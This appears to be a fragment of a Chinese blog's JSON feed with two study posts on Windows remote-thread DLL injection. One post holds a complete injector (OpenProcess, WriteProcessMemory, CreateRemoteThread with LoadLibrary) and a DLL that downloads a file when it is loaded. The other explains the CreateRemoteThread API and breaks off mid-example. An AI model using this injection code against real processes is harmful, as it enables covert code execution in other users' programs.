<span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 下载文件保存到 szPath 所描述的文件中</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>BOOL APIENTRY <span class=\"token function\">DllMain</span><span class=\"token punctuation\">(</span> HMODULE hModule<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                       DWORD  ul_reason_for_call<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                       LPVOID lpReserved</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                     <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>ul_reason_for_call<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_PROCESS_ATTACH<span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        HANDLE hTread <span class=\"token operator\">=</span> <span class=\"token function\">CreateThread</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> ThreadProc<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hTread<span class=\"token operator\">==</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token function\">MessageBox</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"CreateThread Error!!\"</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"Or0kit\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token function\">MessageBox</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"Inject Success!!\"</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"Or0kit\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hTread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_THREAD_ATTACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_THREAD_DETACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">case</span> DLL_PROCESS_DETACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主程序</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;TlHelp32.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;tchar.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">DllPath</span> <span class=\"token expression\">L</span><span class=\"token string\">\"F:\\\\000Users\\\\Desktop\\\\Dll2021-7-19.dll\"</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 获取进程 name 的 ID</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>DWORD <span class=\"token function\">getPid</span><span class=\"token punctuation\">(</span>LPTSTR name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    HANDLE hProcSnap <span class=\"token operator\">=</span> <span class=\"token function\">CreateToolhelp32Snapshot</span><span class=\"token punctuation\">(</span>TH32CS_SNAPPROCESS<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取进程快照句柄</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>hProcSnap <span class=\"token operator\">!=</span> INVALID_HANDLE_VALUE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    PROCESSENTRY32 pe32<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    pe32<span class=\"token punctuation\">.</span>dwSize <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>PROCESSENTRY32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    BOOL flag <span class=\"token operator\">=</span> <span class=\"token function\">Process32First</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pe32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取列表的第一个进程</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">_tcscmp</span><span class=\"token punctuation\">(</span>pe32<span class=\"token punctuation\">.</span>szExeFile<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">return</span> pe32<span class=\"token punctuation\">.</span>th32ProcessID<span class=\"token punctuation\">;</span><span class=\"token comment\">//pid</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        flag <span class=\"token operator\">=</span> <span class=\"token function\">Process32Next</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pe32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取下一个进程</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">// 远程线程注入</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>bool <span class=\"token function\">RemoteThreadInject</span><span class=\"token punctuation\">(</span>LPTSTR ProcName<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    DWORD dwPid <span class=\"token operator\">=</span> <span class=\"token function\">getPid</span><span class=\"token punctuation\">(</span>ProcName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token comment\">//1. 使用 PID 打开进程获取权限</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    HANDLE hProcess <span class=\"token operator\">=</span> <span class=\"token function\">OpenProcess</span><span class=\"token punctuation\">(</span>PROCESS_ALL_ACCESS<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> dwPid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\">//2. 申请内存，写入 DLL 路径</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">int</span> nLen <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>WCHAR<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token function\">wcslen</span><span class=\"token punctuation\">(</span>DllPath<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    LPVOID pBuf <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAllocEx</span><span class=\"token punctuation\">(</span>hProcess<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> nLen<span class=\"token punctuation\">,</span> MEM_RESERVE <span class=\"token operator\">|</span> MEM_COMMIT<span class=\"token punctuation\">,</span> PAGE_READWRITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>pBuf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"申请内存失败！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">return</span> false<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token comment\">//3. 写入内存</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    DWORD dwWrite <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">WriteProcessMemory</span><span class=\"token punctuation\">(</span>hProcess<span class=\"token punctuation\">,</span> pBuf<span class=\"token punctuation\">,</span> DllPath<span class=\"token punctuation\">,</span> nLen<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>dwWrite<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"写入内存失败！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">return</span> false<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token comment\">//4. 创建远程线程，让对方调用 LoadLibrary</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    HANDLE hRemoteThread <span class=\"token operator\">=</span> <span class=\"token function\">CreateRemoteThread</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        hProcess<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token punctuation\">(</span>LPTHREAD_START_ROUTINE<span class=\"token punctuation\">)</span>LoadLibrary<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        pBuf<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token comment\">//5. 等待线程结束返回，释放资源</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span>hRemoteThread<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hRemoteThread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token function\">VirtualFreeEx</span><span class=\"token punctuation\">(</span>hProcess<span class=\"token punctuation\">,</span> pBuf<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> MEM_FREE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">return</span> true<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token function\">RemoteThreadInject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LPTSTR<span class=\"token punctuation\">)</span><span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Win2021-7-19.exe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span>；</pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>首先这是我们没注入前的桌面</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>运行我们的受害者</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>运行我们的注入程序</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>结果</p>\n<p><img data-src=\"image005.png\" alt=\"\" /><br />\n<img data-src=\"image006.png\" alt=\"\" /></p>\n<p>不过我这里出了点问题，不过程序还是跑起来了……</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<p>等有时间了再调试吧。</p>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNjY5MDEuaHRt\">https://bbs.pediy.com/thread-266901.htm</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doYXRkYXkvYXJ0aWNsZS9kZXRhaWxzLzg5NzU5MzA=\">https://blog.csdn.net/whatday/article/details/8975930</span></p>\n",
            "tags": [
                "Win32",
                "远程线程",
                "DLL注入",
                "DLL注入相关函数"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B/",
            "url": "https://self-ferry.github.io/Win%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B/",
            "title": "Win远程线程",
            "date_published": "2021-07-14T06:50:59.000Z",
            "content_html": "<h1 id=\"远程线程函数createremotethread\"><a class=\"anchor\" href=\"#远程线程函数createremotethread\">#</a> 远程线程函数 CreateRemoteThread</h1>\n<p>CreateRemoteThread 是一个 Windows API 函数，它能够创建一个在其它进程地址空间中运行的线程。</p>\n<h2 id=\"函数原型\"><a class=\"anchor\" href=\"#函数原型\">#</a> 函数原型</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HANDLE WINAPI <span class=\"token function\">CreateRemoteThread</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>__in HANDLE hProcess<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>__in LPSECURITY_ATTRIBUTES lpThreadAttributes<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>__in SIZE_T dwStackSize<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>__in LPTHREAD_START_ROUTINE lpStartAddress<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>__in LPVOID lpParameter<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>__in DWORD dwCreationFlags<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>__out LPDWORD lpThreadId</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"参数说明\"><a class=\"anchor\" href=\"#参数说明\">#</a> 参数说明</h2>\n<ol>\n<li>\n<p>hProcess [in]<br />\n 线程所属进程的进程句柄.<br />\n 该句柄必须具有 PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, 和 PROCESS_VM_READ 访问权限.</p>\n</li>\n<li>\n<p>lpThreadAttributes [in]<br />\n 一个指向 SECURITY_ATTRIBUTES 结构的指针，该结构指定了线程的安全属性.</p>\n</li>\n<li>\n<p>dwStackSize [in]<br />\n 线程栈初始大小，以字节为单位，如果该值设为 0, 那么使用系统默认大小.</p>\n</li>\n<li>\n<p>lpStartAddress [in]<br />\n 在远程进程的地址空间中，该线程的线程函数的起始地址.</p>\n</li>\n<li>\n<p>lpParameter [in]<br />\n 传给线程函数的参数.</p>\n</li>\n<li>\n<p>dwCreationFlags [in]<br />\n 线程的创建标志</p>\n</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">值</th>\n<th style=\"text-align:left\">含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">0</td>\n<td style=\"text-align:left\">线程创建后立即运行</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">CREATE_SUSPENDED 0x00000004</td>\n<td style=\"text-align:left\">线程创建后先将线程挂起，直到 ResumeThread 被调用.</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">STACK_SIZE_PARAM_IS_A_RESERVATION 0x00010000</td>\n<td style=\"text-align:left\">dwStackSize 参数指定为线程栈预订大小，如果 STACK_SIZE_PARAM_IS_A_RESERVATION 没有被指定，dwStackSize 参数指定为线程栈分配大小.</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"7\">\n<li>lpThreadId [out]<br />\n 指向所创建线程 ID 的指针，如果创建失败，该参数为 NULL.</li>\n</ol>\n<h2 id=\"函数返回值\"><a class=\"anchor\" href=\"#函数返回值\">#</a> 函数返回值</h2>\n<p>如果调用成功，返回新线程句柄.<br />\n 如果失败，返回 NULL.</p>\n<h2 id=\"示例\"><a class=\"anchor\" href=\"#示例\">#</a> 示例</h2>\n<p>先创建一个进程，使其执行一个线程。</p>\n<p>创建远程线程的程序</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;TlHelp32.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;tchar.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 获取进程 name 的 ID</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>DWORD <span class=\"token function\">getPid</span><span class=\"token punctuation\">(</span>LPTSTR name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    HANDLE hProcSnap <span class=\"token operator\">=</span> <span class=\"token function\">CreateToolhelp32Snapshot</span><span class=\"token punctuation\">(</span>TH32CS_SNAPPROCESS<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取进程快照句柄</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>hProcSnap <span class=\"token operator\">!=</span> INVALID_HANDLE_VALUE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    PROCESSENTRY32 pe32<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    pe32<span class=\"token punctuation\">.</span>dwSize <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>PROCESSENTRY32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    BOOL flag <span class=\"token operator\">=</span> <span class=\"token function\">Process32First</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pe32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取列表的第一个进程</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">_tcscmp</span><span class=\"token punctuation\">(</span>pe32<span class=\"token punctuation\">.</span>szExeFile<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">return</span> pe32<span class=\"token punctuation\">.</span>th32ProcessID<span class=\"token punctuation\">;</span><span class=\"token comment\">//pid</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        flag <span class=\"token operator\">=</span> <span class=\"token function\">Process32Next</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pe32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取下一个进程</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcSnap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>BOOL <span class=\"token function\">MyRemoteThread</span><span class=\"token punctuation\">(</span>LPTSTR tcProcName<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\">//  获取进程 id</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    DWORD dwProcId<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    dwProcId <span class=\"token operator\">=</span> <span class=\"token function\">getPid</span><span class=\"token punctuation\">(</span>tcProcName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 